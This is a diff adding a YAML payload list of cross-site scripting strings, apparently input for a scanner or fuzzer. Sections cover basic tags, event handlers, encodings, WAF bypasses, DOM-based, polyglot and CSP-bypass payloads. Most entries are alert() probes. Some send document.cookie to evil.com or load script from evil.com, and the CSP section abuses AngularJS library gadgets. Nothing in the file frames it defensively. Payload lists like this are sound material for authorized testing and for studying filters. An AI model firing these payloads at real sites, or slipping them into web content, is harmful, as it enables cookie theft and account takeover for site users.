@@ -1,0 +1,135 @@
+basic:
+- <script>alert('XSS')</script>
+- <script>alert(1)</script>
+- <script>alert(document.cookie)</script>
+- <script>alert(document.domain)</script>
+- <script>prompt('XSS')</script>
+- <script>confirm('XSS')</script>
+- <script>eval('alert(1)')</script>
+- <script>setTimeout('alert(1)',0)</script>
+- <script>setInterval('alert(1)',1000)</script>
+- <script src=//evil.com/xss.js></script>
+- <script>new Image().src='http://evil.com/?c='+document.cookie</script>
+- <img src=x onerror=alert('XSS')>
+- <img src=x onerror=alert(1)>
+- <img/src=x onerror=alert(1)>
+- <img src=x onerror=alert(document.cookie)>
+- <svg onload=alert('XSS')>
+- <svg/onload=alert(1)>
+- <svg onload=alert(1)//
+- <body onload=alert('XSS')>
+- <body onpageshow=alert(1)>
+- <input onfocus=alert('XSS') autofocus>
+- <input onblur=alert('XSS') autofocus autofocus>
+- <textarea onfocus=alert('XSS') autofocus>
+- <keygen onfocus=alert('XSS') autofocus>
+- <select onfocus=alert('XSS') autofocus>
+- <marquee onstart=alert('XSS')>
+- <video><source onerror=alert('XSS')>
+- <video src=x onerror=alert(1)>
+- <audio src=x onerror=alert('XSS')>
+- <iframe src="javascript:alert('XSS')">
+- <iframe srcdoc="<script>alert(1)</script>">
+- <object data="javascript:alert('XSS')">
+- <embed src="javascript:alert('XSS')">
+- <a href="javascript:alert('XSS')">click</a>
+- <a href=javascript:alert(1)>click</a>
+- <form action="javascript:alert('XSS')"><input type=submit>
+- <div onmouseover=alert('XSS')>hover</div>
+- <div onmouseenter=alert(1)>hover</div>
+- <details open ontoggle=alert('XSS')>
+- <details ontoggle=alert(1) open>
+- <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+event_handlers:
+- <img src=x onload=alert(1)>
+- <body onscroll=alert(1)><br><br>...<br><input autofocus>
+- <input type=image src=x onerror=alert(1)>
+- <isindex action=javascript:alert(1) type=image>
+- <form><button formaction=javascript:alert(1)>click
+- <form><input type=submit formaction=javascript:alert(1)>
+- <form><input type=image formaction=javascript:alert(1)>
+- <video poster=javascript:alert(1)//></video>
+- <object data=javascript:alert(1)>
+- <embed code=javascript:alert(1)>
+- <bgsound src=javascript:alert(1)>
+- <link rel=import href=data:text/html,<script>alert(1)</script>
+- <base href=javascript:alert(1)//
+encoded:
+- '&#60;script&#62;alert(''XSS'')&#60;/script&#62;'
+- '%3Cscript%3Ealert(''XSS'')%3C/script%3E'
+- \x3cscript\x3ealert('XSS')\x3c/script\x3e
+- \u003cscript\u003ealert('XSS')\u003c/script\u003e
+- <script>alert(String.fromCharCode(88,83,83))</script>
+- <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+- '%253Cscript%253Ealert(''XSS'')%253C/script%253E'
+- <script>eval(atob('YWxlcnQoMSk='))</script>
+- <script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+- <script>eval('\141\154\145\162\164\050\061\051')</script>
+- <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+- <svg onload=eval(atob('YWxlcnQoMSk='))>
+- <img src=x onerror=eval('\x61lert(1)')>
+waf_bypass:
+- <ScRiPt>alert('XSS')</ScRiPt>
+- <SCRIPT>alert('XSS')</SCRIPT>
+- <script >alert('XSS')</script >
+- "<script\t>alert('XSS')</script\t>"
+- '<script
+
+  >alert(''XSS'')</script
+
+  >'
+- "<script\r>alert('XSS')</script\r>"
+- <scr<script>ipt>alert('XSS')</scr</script>ipt>
+- <<script>alert('XSS')//<</script>
+- <img src=`x`onerror=alert('XSS')>
+- <img/src=x/onerror=alert('XSS')>
+- "<img\tsrc=x\tonerror=alert('XSS')>"
+- '<img
+
+  src=x
+
+  onerror=alert(''XSS'')>'
+- <svg/onload=alert('XSS')>
+- <body/onload=alert('XSS')>
+- '''-alert(''XSS'')-'''
+- '"-alert(''XSS'')-"'
+- javascript:alert('XSS')
+- data:text/html,<script>alert('XSS')</script>
+- data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+- <img src=x:alert(alt) onerror=eval(src) alt='XSS'>
+- <svg><script>alert&#40;1&#41;</script></svg>
+- <svg><script>alert&lpar;1&rpar;</script></svg>
+- <a href=ja&#x0A;vascript:alert(1)>click</a>
+- <a href=j&#97;v&#97;script:alert(1)>click</a>
+- <img src=1 onerror=alert(1)>
+- <img src=1 onerror=\u0061lert(1)>
+- 1<ScRiPt>alert(1)</sCriPt>1
+- 1<ScRiPt >alert(1)</sCriPt >
+dom_based:
+- '#<script>alert(''XSS'')</script>'
+- javascript:alert('XSS')//
+- '''-alert(1)-'''
+- '"><script>alert(''XSS'')</script>'
+- '''><script>alert(''XSS'')</script>'
+- '"onmouseover="alert(''XSS'')"'
+- '''onmouseover=''alert("XSS")'''
+- '" onclick=alert(1)//'
+- ''' onclick=alert(1)//'
+- '"><img src=x onerror=alert(1)>'
+- '''><img src=x onerror=alert(1)>'
+- '" onfocus=alert(1) autofocus x="'
+- ''' onfocus=alert(1) autofocus x='''
+- '"autofocus onfocus=alert(1) x="'
+polyglot:
+- jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
+- '''"><img src=x onerror=alert(1)//'
+- javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+- -->'"onclick=alert(1)//"><img/src=x onerror=alert``>
+- '{{constructor.constructor(''alert(1)'')()}}'
+- <svg/onload=alert(1)>
+- '''"><svg/onload=alert(String.fromCharCode(88,83,83))>'
+csp_bypass:
+- <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+- <script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+- <base href="https://evil.com/"><script src="/xss.js"></script>
+- <meta http-equiv="refresh" content="0; url=javascript:alert(1)">
